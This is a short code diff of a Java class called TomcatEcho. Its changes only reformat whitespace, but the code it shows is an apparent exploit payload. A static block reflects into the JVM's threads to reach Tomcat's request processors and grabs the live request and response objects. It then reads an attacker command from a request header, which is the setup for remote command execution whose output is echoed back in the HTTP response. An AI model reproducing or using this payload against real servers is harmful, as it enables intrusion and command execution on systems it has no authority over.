@@ -6,10 +6,10 @@ public class TomcatEcho {
 
     static {
         try {
-            boolean                 flag   = false;
-            ThreadGroup             group  = Thread.currentThread().getThreadGroup();
-            ClassLoader             loader = Thread.currentThread().getContextClassLoader();
-            java.lang.reflect.Field f      = group.getClass().getDeclaredField("threads");
+            boolean flag = false;
+            ThreadGroup group = Thread.currentThread().getThreadGroup();
+            ClassLoader loader = Thread.currentThread().getContextClassLoader();
+            java.lang.reflect.Field f = group.getClass().getDeclaredField("threads");
             f.setAccessible(true);
             Thread[] threads = (Thread[]) f.get(group);
             for (int i = 0; i < threads.length; i++) {
@@ -46,7 +46,7 @@ public class TomcatEcho {
                         Object processor = processors.get(j);
                         f = processor.getClass().getDeclaredField("req");
                         f.setAccessible(true);
-                        Object req  = f.get(processor);
+                        Object req = f.get(processor);
                         Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req);
                         str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{CMD_HEADER});
                         if (str != null && !str.isEmpty()) {
